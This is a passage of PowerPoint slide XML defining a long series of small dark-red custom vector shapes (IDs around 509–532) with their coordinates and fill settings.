                  <a:pt x="17" y="10"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="509" name="CustomShape 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5272200"/>
            <a:ext cx="16920" cy="62640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="11" h="40">
                <a:moveTo>
                  <a:pt x="11" y="9"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="11" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="9"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="510" name="CustomShape 126"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5227560"/>
            <a:ext cx="54720" cy="89640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="57">
                <a:moveTo>
                  <a:pt x="35" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="511" name="CustomShape 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5183280"/>
            <a:ext cx="54720" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="56">
                <a:moveTo>
                  <a:pt x="35" y="28"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="28"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="512" name="CustomShape 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="5137200"/>
            <a:ext cx="53280" cy="88200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="56">
                <a:moveTo>
                  <a:pt x="34" y="28"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="56"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="28"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="513" name="CustomShape 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5114880"/>
            <a:ext cx="26280" cy="64440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="41">
                <a:moveTo>
                  <a:pt x="17" y="13"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="13"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="400000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="514" name="CustomShape 130"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5391000"/>
            <a:ext cx="18360" cy="64440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="41">
                <a:moveTo>
                  <a:pt x="12" y="10"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="10"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="515" name="CustomShape 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5340240"/>
            <a:ext cx="54720" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="59">
                <a:moveTo>
                  <a:pt x="35" y="30"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="30"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="516" name="CustomShape 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5291280"/>
            <a:ext cx="54720" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="59">
                <a:moveTo>
                  <a:pt x="35" y="30"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="30"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="517" name="CustomShape 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="5240160"/>
            <a:ext cx="53280" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="59">
                <a:moveTo>
                  <a:pt x="34" y="31"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="31"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="518" name="CustomShape 134"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5216400"/>
            <a:ext cx="26280" cy="65880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="42">
                <a:moveTo>
                  <a:pt x="17" y="14"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="14"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="519" name="CustomShape 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5511960"/>
            <a:ext cx="16920" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="11" h="38">
                <a:moveTo>
                  <a:pt x="11" y="8"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="11" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="8"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="520" name="CustomShape 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5454720"/>
            <a:ext cx="54720" cy="99360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="63">
                <a:moveTo>
                  <a:pt x="35" y="32"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="32"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="521" name="CustomShape 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5400720"/>
            <a:ext cx="54720" cy="94680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="60">
                <a:moveTo>
                  <a:pt x="35" y="32"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="32"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="522" name="CustomShape 138"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4813200" y="5343480"/>
            <a:ext cx="54720" cy="96120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="61">
                <a:moveTo>
                  <a:pt x="35" y="35"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="35"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523" name="CustomShape 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5318280"/>
            <a:ext cx="26280" cy="65880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="42">
                <a:moveTo>
                  <a:pt x="17" y="14"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="14"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="524" name="CustomShape 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5624640"/>
            <a:ext cx="16920" cy="69120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="11" h="44">
                <a:moveTo>
                  <a:pt x="11" y="13"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="11" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="13"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="525" name="CustomShape 141"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4930920" y="5567400"/>
            <a:ext cx="54720" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="65">
                <a:moveTo>
                  <a:pt x="35" y="35"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="35"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="526" name="CustomShape 142"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4873680" y="5506920"/>
            <a:ext cx="54720" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="35" h="65">
                <a:moveTo>
                  <a:pt x="35" y="37"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="35" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="37"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="527" name="CustomShape 143"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815000" y="5450040"/>
            <a:ext cx="53280" cy="99360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="34" h="63">
                <a:moveTo>
                  <a:pt x="34" y="35"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="34" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="35"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="200000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="528" name="CustomShape 144"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5423040"/>
            <a:ext cx="26280" cy="69120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="44">
                <a:moveTo>
                  <a:pt x="17" y="16"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="16"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="529" name="CustomShape 145"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4784760" y="5472000"/>
            <a:ext cx="45360" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="29" h="55">
                <a:moveTo>
                  <a:pt x="29" y="30"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="29" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="30"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="530" name="CustomShape 146"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4944960" y="5635800"/>
            <a:ext cx="61200" cy="111960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="39" h="71">
                <a:moveTo>
                  <a:pt x="39" y="43"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="39" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39" y="43"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="531" name="CustomShape 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4890960" y="5580000"/>
            <a:ext cx="50040" cy="100800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="64">
                <a:moveTo>
                  <a:pt x="32" y="34"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="34"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="532" name="CustomShape 148"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4834080" y="5522760"/>
            <a:ext cx="53280" cy="97560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
